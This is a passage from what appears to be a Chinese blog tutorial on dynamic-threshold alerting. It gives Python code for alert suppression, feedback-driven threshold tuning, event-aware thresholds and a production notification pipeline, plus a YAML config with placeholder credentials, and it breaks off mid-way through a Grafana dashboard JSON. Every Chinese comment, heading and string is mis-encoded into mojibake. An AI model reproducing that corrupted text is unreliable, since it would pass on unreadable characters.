<p>é—®é¢˜ï¼šå³ä½¿æ˜¯åŠ¨æ€é˜ˆå€¼ï¼ŒçŸ­æ—¶é—´å†…ä»å¯èƒ½äº§ç”Ÿå¤§é‡é‡å¤å‘Šè­¦</p>
<p>è§£å†³æ–¹æ¡ˆï¼šå®ç°æ™ºèƒ½å‘Šè­¦æŠ‘åˆ¶</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AlertSuppressor</span>:
    <span class="hljs-string">"""å‘Šè­¦æŠ‘åˆ¶å™¨"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, 
                 cooldown_period=<span class="hljs-number">300</span>,      <span class="hljs-comment"># 5åˆ†é’Ÿå†·å´æœŸ</span>
                 aggregation_window=<span class="hljs-number">60</span></span>):   <span class="hljs-comment"># 1åˆ†é’Ÿèšåˆçª—å£</span>
        self.cooldown_period = cooldown_period
        self.aggregation_window = aggregation_window
        self.last_alert_time = {}
        self.pending_alerts = []
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">should_alert</span>(<span class="hljs-params">self, metric_name, current_time</span>):
        <span class="hljs-string">"""åˆ¤æ–­æ˜¯å¦åº”è¯¥å‘é€å‘Šè­¦"""</span>
        <span class="hljs-keyword">if</span> metric_name <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.last_alert_time:
            self.last_alert_time[metric_name] = current_time
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
        
        time_since_last = (current_time - self.last_alert_time[metric_name]).total_seconds()
        
        <span class="hljs-keyword">if</span> time_since_last &lt; self.cooldown_period:
            <span class="hljs-comment"># åœ¨å†·å´æœŸå†…ï¼Œä¸å‘é€å‘Šè­¦</span>
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
        <span class="hljs-keyword">else</span>:
            self.last_alert_time[metric_name] = current_time
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">aggregate_alerts</span>(<span class="hljs-params">self, alerts</span>):
        <span class="hljs-string">"""èšåˆç›¸ä¼¼å‘Šè­¦"""</span>
        <span class="hljs-comment"># æŒ‰æŒ‡æ ‡ç±»å‹å’Œå‘Šè­¦ç±»å‹åˆ†ç»„</span>
        grouped = {}
        <span class="hljs-keyword">for</span> alert <span class="hljs-keyword">in</span> alerts:
            key = (alert[<span class="hljs-string">'metric'</span>], alert[<span class="hljs-string">'alert_type'</span>])
            <span class="hljs-keyword">if</span> key <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> grouped:
                grouped[key] = []
            grouped[key].append(alert)
        
        <span class="hljs-comment"># ç”Ÿæˆèšåˆå‘Šè­¦</span>
        aggregated = []
        <span class="hljs-keyword">for</span> key, alert_list <span class="hljs-keyword">in</span> grouped.items():
            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(alert_list) &gt; <span class="hljs-number">1</span>:
                aggregated.append({
                    <span class="hljs-string">'metric'</span>: key[<span class="hljs-number">0</span>],
                    <span class="hljs-string">'alert_type'</span>: key[<span class="hljs-number">1</span>],
                    <span class="hljs-string">'count'</span>: <span class="hljs-built_in">len</span>(alert_list),
                    <span class="hljs-string">'first_occurrence'</span>: alert_list[<span class="hljs-number">0</span>][<span class="hljs-string">'timestamp'</span>],
                    <span class="hljs-string">'last_occurrence'</span>: alert_list[-<span class="hljs-number">1</span>][<span class="hljs-string">'timestamp'</span>],
                    <span class="hljs-string">'severity'</span>: <span class="hljs-built_in">max</span>(a[<span class="hljs-string">'severity'</span>] <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> alert_list),
                    <span class="hljs-string">'summary'</span>: <span class="hljs-string">f"<span class="hljs-subst">{key[<span class="hljs-number">0</span>]}</span>åœ¨è¿‡å»<span class="hljs-subst">{self.aggregation_window}</span>ç§’å†…è§¦å‘<span class="hljs-subst">{<span class="hljs-built_in">len</span>(alert_list)}</span>æ¬¡<span class="hljs-subst">{key[<span class="hljs-number">1</span>]}</span>å‘Šè­¦"</span>
                })
            <span class="hljs-keyword">else</span>:
                aggregated.append(alert_list[<span class="hljs-number">0</span>])
        
        <span class="hljs-keyword">return</span> aggregated
</code></pre>
<h3 data-id="heading-18">4.3 è‡ªé€‚åº”å­¦ä¹ ä¸åé¦ˆæœºåˆ¶</h3>
<p>æ ¸å¿ƒæ€æƒ³ï¼šä»è¿ç»´äººå‘˜çš„åé¦ˆä¸­å­¦ä¹ ï¼ŒæŒç»­ä¼˜åŒ–é˜ˆå€¼</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AdaptiveLearningSystem</span>:
    <span class="hljs-string">"""è‡ªé€‚åº”å­¦ä¹ ç³»ç»Ÿ"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, threshold_generator</span>):
        self.threshold_gen = threshold_generator
        self.feedback_history = []
        self.false_positive_count = <span class="hljs-number">0</span>
        self.true_positive_count = <span class="hljs-number">0</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">record_feedback</span>(<span class="hljs-params">self, alert_id, is_true_positive</span>):
        <span class="hljs-string">"""è®°å½•è¿ç»´äººå‘˜çš„åé¦ˆ"""</span>
        self.feedback_history.append({
            <span class="hljs-string">'alert_id'</span>: alert_id,
            <span class="hljs-string">'is_true_positive'</span>: is_true_positive,
            <span class="hljs-string">'timestamp'</span>: datetime.now()
        })
        
        <span class="hljs-keyword">if</span> is_true_positive:
            self.true_positive_count += <span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            self.false_positive_count += <span class="hljs-number">1</span>
            <span class="hljs-comment"># è¯¯æŠ¥ï¼šæ”¾å®½é˜ˆå€¼</span>
            self._adjust_threshold(direction=<span class="hljs-string">'relax'</span>)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_adjust_threshold</span>(<span class="hljs-params">self, direction=<span class="hljs-string">'relax'</span></span>):
        <span class="hljs-string">"""åŠ¨æ€è°ƒæ•´sigmaå€æ•°"""</span>
        current_sigma = self.threshold_gen.sigma_multiplier
        
        <span class="hljs-keyword">if</span> direction == <span class="hljs-string">'relax'</span>:
            <span class="hljs-comment"># è¯¯æŠ¥ç‡é«˜ï¼šå¢åŠ sigmaå€æ•°ï¼ˆæ”¾å®½é˜ˆå€¼ï¼‰</span>
            new_sigma = <span class="hljs-built_in">min</span>(current_sigma * <span class="hljs-number">1.1</span>, <span class="hljs-number">5.0</span>)
        <span class="hljs-keyword">else</span>:
            <span class="hljs-comment"># æ¼æŠ¥ç‡é«˜ï¼šå‡å°‘sigmaå€æ•°ï¼ˆæ”¶ç´§é˜ˆå€¼ï¼‰</span>
            new_sigma = <span class="hljs-built_in">max</span>(current_sigma * <span class="hljs-number">0.9</span>, <span class="hljs-number">2.0</span>)
        
        self.threshold_gen.sigma_multiplier = new_sigma
        
        logging.info(<span class="hljs-string">f"é˜ˆå€¼è°ƒæ•´: <span class="hljs-subst">{current_sigma:<span class="hljs-number">.2</span>f}</span> â†’ <span class="hljs-subst">{new_sigma:<span class="hljs-number">.2</span>f}</span>"</span>)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_accuracy_metrics</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""è®¡ç®—å‡†ç¡®ç‡æŒ‡æ ‡"""</span>
        total = self.true_positive_count + self.false_positive_count
        <span class="hljs-keyword">if</span> total == <span class="hljs-number">0</span>:
            <span class="hljs-keyword">return</span> {<span class="hljs-string">'precision'</span>: <span class="hljs-number">0.0</span>, <span class="hljs-string">'feedback_count'</span>: <span class="hljs-number">0</span>}
        
        precision = self.true_positive_count / total
        
        <span class="hljs-keyword">return</span> {
            <span class="hljs-string">'precision'</span>: <span class="hljs-built_in">round</span>(precision, <span class="hljs-number">3</span>),
            <span class="hljs-string">'true_positives'</span>: self.true_positive_count,
            <span class="hljs-string">'false_positives'</span>: self.false_positive_count,
            <span class="hljs-string">'feedback_count'</span>: total
        }
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">auto_tune</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""è‡ªåŠ¨è°ƒä¼˜"""</span>
        metrics = self.get_accuracy_metrics()
        
        <span class="hljs-keyword">if</span> metrics[<span class="hljs-string">'feedback_count'</span>] &lt; <span class="hljs-number">20</span>:
            <span class="hljs-comment"># åé¦ˆæ ·æœ¬ä¸è¶³ï¼Œä¸è¿›è¡Œè°ƒæ•´</span>
            <span class="hljs-keyword">return</span>
        
        <span class="hljs-keyword">if</span> metrics[<span class="hljs-string">'precision'</span>] &lt; <span class="hljs-number">0.5</span>:
            <span class="hljs-comment"># å‡†ç¡®ç‡ä½äº50%ï¼Œæ”¾å®½é˜ˆå€¼</span>
            self._adjust_threshold(direction=<span class="hljs-string">'relax'</span>)
        <span class="hljs-keyword">elif</span> metrics[<span class="hljs-string">'precision'</span>] &gt; <span class="hljs-number">0.9</span>:
            <span class="hljs-comment"># å‡†ç¡®ç‡å¾ˆé«˜ï¼Œå¯ä»¥é€‚å½“æ”¶ç´§é˜ˆå€¼ä»¥æé«˜æ•æ„Ÿåº¦</span>
            self._adjust_threshold(direction=<span class="hljs-string">'tighten'</span>)
</code></pre>
<h3 data-id="heading-19">4.4 ç‰¹æ®Šåœºæ™¯å¤„ç†</h3>
<h3 data-id="heading-20">4.4.1 ä¿ƒé”€æ´»åŠ¨ç­‰å·²çŸ¥äº‹ä»¶</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">EventAwareThresholdGenerator</span>(<span class="hljs-title class_ inherited__">DynamicThresholdGenerator</span>):
    <span class="hljs-string">"""äº‹ä»¶æ„ŸçŸ¥çš„é˜ˆå€¼ç”Ÿæˆå™¨"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, *args, **kwargs</span>):
        <span class="hljs-built_in">super</span>().__init__(*args, **kwargs)
        self.scheduled_events = []
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">register_event</span>(<span class="hljs-params">self, event_name, start_time, end_time, expected_multiplier</span>):
        <span class="hljs-string">"""
        æ³¨å†Œå·²çŸ¥äº‹ä»¶
        
        Args:
            event_name: äº‹ä»¶åç§°ï¼ˆå¦‚"åŒ11ä¿ƒé”€"ï¼‰
            start_time: å¼€å§‹æ—¶é—´
            end_time: ç»“æŸæ—¶é—´
            expected_multiplier: é¢„æœŸè´Ÿè½½å€æ•°ï¼ˆå¦‚3.0è¡¨ç¤º3å€è´Ÿè½½ï¼‰
        """</span>
        self.scheduled_events.append({
            <span class="hljs-string">'name'</span>: event_name,
            <span class="hljs-string">'start'</span>: start_time,
            <span class="hljs-string">'end'</span>: end_time,
            <span class="hljs-string">'multiplier'</span>: expected_multiplier
        })
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_calculate_dynamic_thresholds</span>(<span class="hljs-params">self, decomposition</span>):
        <span class="hljs-string">"""é‡å†™é˜ˆå€¼è®¡ç®—ï¼Œè€ƒè™‘å·²çŸ¥äº‹ä»¶"""</span>
        base_thresholds = <span class="hljs-built_in">super</span>()._calculate_dynamic_thresholds(decomposition)
        
        <span class="hljs-comment"># æ£€æŸ¥å½“å‰æ˜¯å¦åœ¨äº‹ä»¶æœŸé—´</span>
        current_time = datetime.now()
        <span class="hljs-keyword">for</span> event <span class="hljs-keyword">in</span> self.scheduled_events:
            <span class="hljs-keyword">if</span> event[<span class="hljs-string">'start'</span>] &lt;= current_time &lt;= event[<span class="hljs-string">'end'</span>]:
                <span class="hljs-comment"># åœ¨äº‹ä»¶æœŸé—´ï¼Œæ”¾å®½ä¸Šç•Œ</span>
                multiplier = event[<span class="hljs-string">'multiplier'</span>]
                base_thresholds[<span class="hljs-string">'upper'</span>] *= multiplier
                base_thresholds[<span class="hljs-string">'expected'</span>] *= multiplier
                
                logging.info(<span class="hljs-string">f"æ£€æµ‹åˆ°äº‹ä»¶'<span class="hljs-subst">{event[<span class="hljs-string">'name'</span>]}</span>'ï¼Œé˜ˆå€¼å·²è°ƒæ•´"</span>)
                <span class="hljs-keyword">break</span>
        
        <span class="hljs-keyword">return</span> base_thresholds
</code></pre>
<p>4.4.2 å†·å¯åŠ¨é—®é¢˜</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ColdStartHandler</span>:
    <span class="hljs-string">"""å†·å¯åŠ¨å¤„ç†å™¨"""</span>
    
<span class="hljs-meta">    @staticmethod</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_initial_thresholds</span>(<span class="hljs-params">metric_type, percentile=<span class="hljs-number">95</span></span>):
        <span class="hljs-string">"""
        åŸºäºå†å²ç»Ÿè®¡æ•°æ®çš„åˆå§‹é˜ˆå€¼
        
        Args:
            metric_type: æŒ‡æ ‡ç±»å‹ï¼ˆcpu/memory/diskç­‰ï¼‰
            percentile: ç™¾åˆ†ä½æ•°
        """</span>
        <span class="hljs-comment"># ä»å†å²æ•°æ®åº“åŠ è½½åŒç±»å‹æœåŠ¡çš„ç»Ÿè®¡æ•°æ®</span>
        historical_stats = {
            <span class="hljs-string">'cpu'</span>: {<span class="hljs-string">'p50'</span>: <span class="hljs-number">45</span>, <span class="hljs-string">'p95'</span>: <span class="hljs-number">75</span>, <span class="hljs-string">'p99'</span>: <span class="hljs-number">85</span>},
            <span class="hljs-string">'memory'</span>: {<span class="hljs-string">'p50'</span>: <span class="hljs-number">60</span>, <span class="hljs-string">'p95'</span>: <span class="hljs-number">80</span>, <span class="hljs-string">'p99'</span>: <span class="hljs-number">90</span>},
            <span class="hljs-string">'response_time'</span>: {<span class="hljs-string">'p50'</span>: <span class="hljs-number">100</span>, <span class="hljs-string">'p95'</span>: <span class="hljs-number">500</span>, <span class="hljs-string">'p99'</span>: <span class="hljs-number">1000</span>}
        }
        
        <span class="hljs-keyword">if</span> metric_type <span class="hljs-keyword">in</span> historical_stats:
            <span class="hljs-keyword">return</span> {
                <span class="hljs-string">'upper'</span>: historical_stats[metric_type][<span class="hljs-string">'p95'</span>],
                <span class="hljs-string">'lower'</span>: <span class="hljs-number">0</span>,
                <span class="hljs-string">'confidence'</span>: <span class="hljs-number">0.3</span>  <span class="hljs-comment"># ä½ç½®ä¿¡åº¦</span>
            }
        <span class="hljs-keyword">else</span>:
            <span class="hljs-comment"># æœªçŸ¥æŒ‡æ ‡ç±»å‹ï¼Œä½¿ç”¨ä¿å®ˆé˜ˆå€¼</span>
            <span class="hljs-keyword">return</span> {
                <span class="hljs-string">'upper'</span>: <span class="hljs-built_in">float</span>(<span class="hljs-string">'inf'</span>),
                <span class="hljs-string">'lower'</span>: <span class="hljs-number">0</span>,
                <span class="hljs-string">'confidence'</span>: <span class="hljs-number">0.0</span>
            }
</code></pre>
<h2 data-id="heading-21">äº”ã€ç”Ÿäº§ç¯å¢ƒéƒ¨ç½²å®è·µ</h2>
<h3 data-id="heading-22">5.1 ç³»ç»Ÿé›†æˆæ¶æ„</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductionAlertingSystem</span>:
    <span class="hljs-string">"""ç”Ÿäº§çº§å‘Šè­¦ç³»ç»Ÿ"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, config</span>):
        <span class="hljs-comment"># æ ¸å¿ƒç»„ä»¶</span>
        self.threshold_generators = {}
        self.alert_suppressor = AlertSuppressor()
        self.learning_system = AdaptiveLearningSystem(<span class="hljs-literal">None</span>)
        self.multi_metric_detector = MultiMetricAnomalyDetector()
        
        <span class="hljs-comment"># æ•°æ®å­˜å‚¨</span>
        self.timeseries_db = InfluxDBClient(config[<span class="hljs-string">'influxdb'</span>])
        self.alert_db = PostgreSQLClient(config[<span class="hljs-string">'postgres'</span>])
        
        <span class="hljs-comment"># å‘Šè­¦é€šé“</span>
        self.notifiers = {
            <span class="hljs-string">'dingtalk'</span>: DingTalkNotifier(config[<span class="hljs-string">'dingtalk_webhook'</span>]),
            <span class="hljs-string">'email'</span>: EmailNotifier(config[<span class="hljs-string">'smtp'</span>]),
            <span class="hljs-string">'pagerduty'</span>: PagerDutyNotifier(config[<span class="hljs-string">'pagerduty_key'</span>])
        }
        
        <span class="hljs-comment"># é…ç½®</span>
        self.config = config
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">process_metric</span>(<span class="hljs-params">self, metric_name, value, timestamp, metadata</span>):
        <span class="hljs-string">"""å¤„ç†å•ä¸ªæŒ‡æ ‡"""</span>
        <span class="hljs-comment"># 1. è·å–æˆ–åˆ›å»ºé˜ˆå€¼ç”Ÿæˆå™¨</span>
        <span class="hljs-keyword">if</span> metric_name <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.threshold_generators:
            self.threshold_generators[metric_name] = self._create_threshold_generator(
                metric_name, metadata
            )
        
        generator = self.threshold_generators[metric_name]
        
        <span class="hljs-comment"># 2. è®¡ç®—åŠ¨æ€é˜ˆå€¼</span>
        result = generator.update_and_get_thresholds(value, timestamp)
        
        <span class="hljs-comment"># 3. å­˜å‚¨ç»“æœåˆ°æ—¶åºæ•°æ®åº“</span>
        self._store_threshold_data(metric_name, result)
        
        <span class="hljs-comment"># 4. å¦‚æœè§¦å‘å‘Šè­¦ï¼Œè¿›è¡Œåç»­å¤„ç†</span>
        <span class="hljs-keyword">if</span> result[<span class="hljs-string">'is_alert'</span>]:
            self._handle_alert(metric_name, result, metadata)
        
        <span class="hljs-keyword">return</span> result
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_create_threshold_generator</span>(<span class="hljs-params">self, metric_name, metadata</span>):
        <span class="hljs-string">"""æ ¹æ®æŒ‡æ ‡ç±»å‹åˆ›å»ºåˆé€‚çš„ç”Ÿæˆå™¨"""</span>
        metric_config = self.config[<span class="hljs-string">'metrics'</span>].get(
            metadata.get(<span class="hljs-string">'type'</span>, <span class="hljs-string">'default'</span>),
            self.config[<span class="hljs-string">'metrics'</span>][<span class="hljs-string">'default'</span>]
        )
        
        <span class="hljs-keyword">if</span> metadata.get(<span class="hljs-string">'has_scheduled_events'</span>):
            <span class="hljs-keyword">return</span> EventAwareThresholdGenerator(
                window_size=metric_config[<span class="hljs-string">'window_size'</span>],
                seasonal_period=metric_config[<span class="hljs-string">'seasonal_period'</span>]
            )
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> DynamicThresholdGenerator(
                window_size=metric_config[<span class="hljs-string">'window_size'</span>],
                seasonal_period=metric_config[<span class="hljs-string">'seasonal_period'</span>]
            )
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_handle_alert</span>(<span class="hljs-params">self, metric_name, result, metadata</span>):
        <span class="hljs-string">"""å¤„ç†å‘Šè­¦"""</span>
        <span class="hljs-comment"># 1. å‘Šè­¦æŠ‘åˆ¶æ£€æŸ¥</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.alert_suppressor.should_alert(metric_name, result[<span class="hljs-string">'timestamp'</span>]):
            logging.info(<span class="hljs-string">f"å‘Šè­¦è¢«æŠ‘åˆ¶: <span class="hljs-subst">{metric_name}</span>"</span>)
            <span class="hljs-keyword">return</span>
        
        <span class="hljs-comment"># 2. æ„å»ºå‘Šè­¦å¯¹è±¡</span>
        alert = {
            <span class="hljs-string">'id'</span>: self._generate_alert_id(),
            <span class="hljs-string">'metric'</span>: metric_name,
            <span class="hljs-string">'timestamp'</span>: result[<span class="hljs-string">'timestamp'</span>],
            <span class="hljs-string">'current_value'</span>: result[<span class="hljs-string">'current_value'</span>],
            <span class="hljs-string">'expected_value'</span>: result[<span class="hljs-string">'expected_value'</span>],
            <span class="hljs-string">'upper_bound'</span>: result[<span class="hljs-string">'upper_bound'</span>],
            <span class="hljs-string">'lower_bound'</span>: result[<span class="hljs-string">'lower_bound'</span>],
            <span class="hljs-string">'deviation'</span>: result[<span class="hljs-string">'deviation_percentage'</span>],
            <span class="hljs-string">'confidence'</span>: result[<span class="hljs-string">'confidence'</span>],
            <span class="hljs-string">'alert_type'</span>: result[<span class="hljs-string">'alert_type'</span>],
            <span class="hljs-string">'severity'</span>: self._calculate_severity(result),
            <span class="hljs-string">'metadata'</span>: metadata
        }
        
        <span class="hljs-comment"># 3. å­˜å‚¨å‘Šè­¦è®°å½•</span>
        self.alert_db.insert_alert(alert)
        
        <span class="hljs-comment"># 4. å‘é€é€šçŸ¥</span>
        self._send_notifications(alert)
        
        <span class="hljs-comment"># 5. è§¦å‘è‡ªåŠ¨åŒ–å“åº”ï¼ˆå¯é€‰ï¼‰</span>
        <span class="hljs-keyword">if</span> self.config.get(<span class="hljs-string">'auto_remediation_enabled'</span>):
            self._trigger_auto_remediation(alert)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_calculate_severity</span>(<span class="hljs-params">self, result</span>):
        <span class="hljs-string">"""è®¡ç®—å‘Šè­¦ä¸¥é‡ç¨‹åº¦"""</span>
        deviation = <span class="hljs-built_in">abs</span>(result[<span class="hljs-string">'deviation_percentage'</span>])
        confidence = result[<span class="hljs-string">'confidence'</span>]
        
        <span class="hljs-comment"># ç»¼åˆåç¦»åº¦å’Œç½®ä¿¡åº¦</span>
        severity_score = deviation * confidence
        
        <span class="hljs-keyword">if</span> severity_score &gt; <span class="hljs-number">100</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">'critical'</span>
        <span class="hljs-keyword">elif</span> severity_score &gt; <span class="hljs-number">50</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">'warning'</span>
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">'info'</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_send_notifications</span>(<span class="hljs-params">self, alert</span>):
        <span class="hljs-string">"""å‘é€å‘Šè­¦é€šçŸ¥"""</span>
        severity = alert[<span class="hljs-string">'severity'</span>]
        
        <span class="hljs-comment"># æ ¹æ®ä¸¥é‡ç¨‹åº¦é€‰æ‹©é€šçŸ¥æ¸ é“</span>
        <span class="hljs-keyword">if</span> severity == <span class="hljs-string">'critical'</span>:
            <span class="hljs-comment"># ä¸¥é‡å‘Šè­¦ï¼šæ‰€æœ‰æ¸ é“</span>
            <span class="hljs-keyword">for</span> notifier <span class="hljs-keyword">in</span> self.notifiers.values():
                notifier.send(alert)
        <span class="hljs-keyword">elif</span> severity == <span class="hljs-string">'warning'</span>:
            <span class="hljs-comment"># è­¦å‘Šï¼šé’‰é’‰ + é‚®ä»¶</span>
            self.notifiers[<span class="hljs-string">'dingtalk'</span>].send(alert)
            self.notifiers[<span class="hljs-string">'email'</span>].send(alert)
        <span class="hljs-keyword">else</span>:
            <span class="hljs-comment"># ä¿¡æ¯ï¼šä»…é’‰é’‰</span>
            self.notifiers[<span class="hljs-string">'dingtalk'</span>].send(alert)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_store_threshold_data</span>(<span class="hljs-params">self, metric_name, result</span>):
        <span class="hljs-string">"""å­˜å‚¨é˜ˆå€¼æ•°æ®åˆ°æ—¶åºæ•°æ®åº“"""</span>
        point = {
            <span class="hljs-string">'measurement'</span>: <span class="hljs-string">'dynamic_thresholds'</span>,
            <span class="hljs-string">'tags'</span>: {
                <span class="hljs-string">'metric'</span>: metric_name
            },
            <span class="hljs-string">'time'</span>: result[<span class="hljs-string">'timestamp'</span>],
            <span class="hljs-string">'fields'</span>: {
                <span class="hljs-string">'current_value'</span>: result[<span class="hljs-string">'current_value'</span>],
                <span class="hljs-string">'expected_value'</span>: result[<span class="hljs-string">'expected_value'</span>],
                <span class="hljs-string">'upper_bound'</span>: result[<span class="hljs-string">'upper_bound'</span>],
                <span class="hljs-string">'lower_bound'</span>: result[<span class="hljs-string">'lower_bound'</span>],
                <span class="hljs-string">'confidence'</span>: result[<span class="hljs-string">'confidence'</span>]
            }
        }
        self.timeseries_db.write_points([point])
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_generate_alert_id</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""ç”Ÿæˆå”¯ä¸€å‘Šè­¦ID"""</span>
        <span class="hljs-keyword">import</span> uuid
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(uuid.uuid4())
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_trigger_auto_remediation</span>(<span class="hljs-params">self, alert</span>):
        <span class="hljs-string">"""è§¦å‘è‡ªåŠ¨ä¿®å¤"""</span>
        <span class="hljs-comment"># ç¤ºä¾‹ï¼šCPUè¿‡é«˜æ—¶è‡ªåŠ¨æ‰©å®¹</span>
        <span class="hljs-keyword">if</span> alert[<span class="hljs-string">'metric'</span>] == <span class="hljs-string">'cpu_usage'</span> <span class="hljs-keyword">and</span> alert[<span class="hljs-string">'severity'</span>] == <span class="hljs-string">'critical'</span>:
            logging.info(<span class="hljs-string">"è§¦å‘è‡ªåŠ¨æ‰©å®¹..."</span>)
            <span class="hljs-comment"># è°ƒç”¨äº‘å¹³å°APIè¿›è¡Œæ‰©å®¹</span>
            <span class="hljs-comment"># cloud_api.scale_up(instance_id)</span>
</code></pre>
<p>5.2 é…ç½®æ–‡ä»¶ç¤ºä¾‹</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># config.yaml</span>
<span class="hljs-attr">metrics:</span>
  <span class="hljs-attr">default:</span>
    <span class="hljs-attr">window_size:</span> <span class="hljs-number">168</span>
    <span class="hljs-attr">seasonal_period:</span> <span class="hljs-number">24</span>
    <span class="hljs-attr">sigma_multiplier:</span> <span class="hljs-number">3</span>
    <span class="hljs-attr">min_samples:</span> <span class="hljs-number">48</span>
  
  <span class="hljs-attr">high_frequency:</span>
    <span class="hljs-attr">window_size:</span> <span class="hljs-number">24</span>
    <span class="hljs-attr">seasonal_period:</span> <span class="hljs-number">1</span>
    <span class="hljs-attr">sigma_multiplier:</span> <span class="hljs-number">2.5</span>
    <span class="hljs-attr">min_samples:</span> <span class="hljs-number">12</span>
  
  <span class="hljs-attr">batch_job:</span>
    <span class="hljs-attr">window_size:</span> <span class="hljs-number">720</span>
    <span class="hljs-attr">seasonal_period:</span> <span class="hljs-number">168</span>
    <span class="hljs-attr">sigma_multiplier:</span> <span class="hljs-number">4</span>
    <span class="hljs-attr">min_samples:</span> <span class="hljs-number">168</span>

<span class="hljs-attr">alert_suppression:</span>
  <span class="hljs-attr">cooldown_period:</span> <span class="hljs-number">300</span>  <span class="hljs-comment"># 5åˆ†é’Ÿ</span>
  <span class="hljs-attr">aggregation_window:</span> <span class="hljs-number">60</span>  <span class="hljs-comment"># 1åˆ†é’Ÿ</span>

<span class="hljs-attr">notifications:</span>
  <span class="hljs-attr">dingtalk_webhook:</span> <span class="hljs-string">"https://oapi.dingtalk.com/robot/send?access_token=xxx"</span>
  <span class="hljs-attr">smtp:</span>
    <span class="hljs-attr">host:</span> <span class="hljs-string">"smtp.company.com"</span>
    <span class="hljs-attr">port:</span> <span class="hljs-number">587</span>
    <span class="hljs-attr">username:</span> <span class="hljs-string">"alert@company.com"</span>
    <span class="hljs-attr">password:</span> <span class="hljs-string">"xxx"</span>
  <span class="hljs-attr">pagerduty_key:</span> <span class="hljs-string">"xxx"</span>

<span class="hljs-attr">auto_remediation_enabled:</span> <span class="hljs-literal">true</span>

<span class="hljs-attr">influxdb:</span>
  <span class="hljs-attr">host:</span> <span class="hljs-string">"localhost"</span>
  <span class="hljs-attr">port:</span> <span class="hljs-number">8086</span>
  <span class="hljs-attr">database:</span> <span class="hljs-string">"monitoring"</span>

<span class="hljs-attr">postgres:</span>
  <span class="hljs-attr">host:</span> <span class="hljs-string">"localhost"</span>
  <span class="hljs-attr">port:</span> <span class="hljs-number">5432</span>
  <span class="hljs-attr">database:</span> <span class="hljs-string">"alerts"</span>
  <span class="hljs-attr">username:</span> <span class="hljs-string">"admin"</span>
  <span class="hljs-attr">password:</span> <span class="hljs-string">"xxx"</span>
</code></pre>
<h3 data-id="heading-23">5.3 ç›‘æ§ä¸å¯è§†åŒ–</h3>
<h3 data-id="heading-24">5.3.1 Grafana Dashboardé…ç½®</h3>
<pre><code class="hljs language-lua" lang="lua">{
  <span class="hljs-string">"dashboard"</span>: {
    <span class="hljs-string">"title"</span>: <span class="hljs-string">"åŠ¨æ€é˜ˆå€¼ç›‘æ§"</span>,
    <span class="hljs-string">"panels"</span>: [
      {
        <span class="hljs-string">"title"</span>: <span class="hljs-string">"CPUä½¿ç”¨ç‡ - åŠ¨æ€é˜ˆå€¼"</span>,
        <span class="hljs-string">"targets"</span>: [
          {
            <span class="hljs-string">"measurement"</span>: <span class="hljs-string">"dynamic_thresholds"</span>,
            <span class="hljs-string">"select"</span>: [
              [<span class="hljs-string">"current_value"</span>, <span class="hljs-string">"å®é™…å€¼"</span>],
              [<span class="hljs-string">"expected_value"</span>, <span class="hljs-string">"é¢„æœŸå€¼"</span>],
              [<span class="hljs-string">"upper_bound"</span>, <span class="hljs-string">"ä¸Šç•Œ"</span>],
              [<span class="hljs-string">"lower_bound"</span>, <span class="hljs-string">"ä¸‹ç•Œ"</span>]
            ],
            <span class="hljs-string">"where"</span>: [
              {<span class="hljs-string">"key"</span>: <span class="hljs-string">"metric"</span>, <span class="hljs-string">"value"</span>: <span class="hljs-string">"cpu_usage"</span>}
            ]
          }
        ],
        <span class="hljs-string">"visualization"</span>: <span class="hljs-string">"timeseries"</span>,
        <span class="hljs-string">"fieldConfig"</span>: {
          <span class="hljs-string">"overrides"</span>: [
            {
